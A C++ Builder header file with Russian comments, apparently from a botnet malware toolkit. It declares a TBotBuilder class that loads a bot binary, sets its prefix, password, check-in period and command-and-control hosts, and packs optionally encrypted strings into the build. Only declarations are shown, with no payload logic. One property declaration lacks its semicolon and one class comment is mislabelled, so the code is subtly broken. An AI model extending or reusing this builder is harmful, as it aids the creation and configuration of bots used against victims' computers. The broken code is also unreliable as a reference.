//---------------------------------------------------------------------------
//  Утилиты для создания сборки бота
//  Код расчитан на C++ Builder
//---------------------------------------------------------------------------

#ifndef BuilderUtilsH
#define BuilderUtilsH
//---------------------------------------------------------------------------
#include <windows.h>
#include <Classes.hpp>


namespace Builder
{

	//-------------------------------------------------------------------
	//  PackStringsToDoubleZeroEndLine - функция упаковывает строки в
	//		одну строку. Каждая строка будет отделена нулевым символом.
	//		В конце последней строки будет стоять два нулевых символа
	//		Пустые строки будут проигнорированы.
	//
	//  Lines - Исходный набор строк
	//
	//  CryptLines - Указывает о необходимости шифровать каждую строку
	//				 перед упаковкой.
	//
	//  TrimLines - Разрешает обрезку пробелов с лева и правва строки.
	//
	//
	//  OutBuf - результирующий буфер. Память выделяется функцией MemAlloc
	//
	//  OutBufSize - Размер результирующего буфера
	//
	//  Функция возвращает истину если удалось упаковать хотя-бы одну
	//			строку
	//
	//  Примечание: В исходный набор строк Lines могут быть внесены
	//              изменения. П этому если необходимо сохранить строки
	//				в исходном состоянии передавайте их копию
	//-------------------------------------------------------------------
	bool PackStringsToDoubleZeroEndLine(TStrings *Lines,
										bool CryptLines, bool TrimLines,
										PCHAR &OutBuf, DWORD &OutBufSize);
}



class TBotBuilder;
class TBotModule;
class TBotParam;



enum TBotParamStatus {psOk, psWarning, psError};


//*************************************************************
//  TBotBuilder - Класс, сборщик бота
//*************************************************************
class TBotBuilder : public TComponent
{
private:
	UnicodeString FSourceFileName;
	UnicodeString FResultFileName;
	bool FResultFileNameChanged;
	TCollection* FParams;
	TList* FModules;
	TList* FActiveModules;
	TMemoryStream* FFile;   // Загруженный файл
	TBotParam* FPrefix;     // Префикс бота
	TBotParam* FPassword;   // Пароль бота
	TBotParam* FDelay;      // Период отстука
	TBotParam* FHosts;      // Основные хосты
	friend class TBotModule;
	friend class TBotParam;
    void __fastcall UpdateResultFileName(bool Reset);
protected:
    void __fastcall virtual ParamValueChanged(TBotParam* Sender);
public:
	__fastcall TBotBuilder(TComponent* AOwner);
	__fastcall ~TBotBuilder();


	void __fastcall LoadSourceFile(const UnicodeString &FileName);
	TBotParamStatus __fastcall CheckParams(TStrings* Errors);
	bool __fastcall Build();

	__property UnicodeString SourceFileName = {read=FSourceFileName};
	__property UnicodeString ResultFileName = {read=FResultFileName};

	// Базовые параметры бота
	__property TBotParam* Prefix   = {read = FPrefix};
	__property TBotParam* Password = {read = FPassword};
	__property TBotParam* Delay    = {read = FDelay};
	__property TBotParam* Hosts    = {read = FHosts};
};


//*************************************************************
//  TBotModule - Класс настроек отдельного модуля
//*************************************************************
class TBotParam : public TCollectionItem
{
private:
	TBotBuilder* FOwner;
	AnsiString FName;
	bool  FNotNull;   // Обязательный параметр
	DWORD FSize;      // Размер буфера параметра
	PCHAR FData;      // Данные
	DWORD FDataSize;  // Размер данных
	UnicodeString FTitle;
	void __fastcall Changed();
	UnicodeString __fastcall GetAsUnicodeString();
	void __fastcall SetAsUnicodeString(const UnicodeString &Value);
	DWORD __fastcall GetAsInt();
	void __fastcall SetAsInt(DWORD Value);
protected:
	UnicodeString __fastcall GetDisplayName(void);
    void __fastcall virtual DoChanged();
public:
	__fastcall TBotParam(TBotBuilder* AOwner, bool NotNull, const char* Name, DWORD Size, const char* Title);
	__fastcall ~TBotParam();

	bool __fastcall IsEmpty();
	void __fastcall Clear();
	void __fastcall SetValue(PCHAR Value, DWORD ValueSize);
	TBotParamStatus __fastcall Status();

	__property UnicodeString Title = {read = FTitle, write = FTitle};
	__property DWORD AsInt = {read = GetAsInt, write = SetAsInt}
	__property UnicodeString AsUnicodeString = {read = GetAsUnicodeString, write = SetAsUnicodeString};

};


//*************************************************************
//  TBotModule - Класс настроек отдельного модуля
//*************************************************************
class TBotModule : public TComponent
{
private:
	TBotBuilder* FBuilder;
public:
	TBotModule(TBotBuilder* AOwner);
	__property TBotBuilder* Builder = {read = FBuilder};
};




//---------------------------------------------------------------------------
#endif
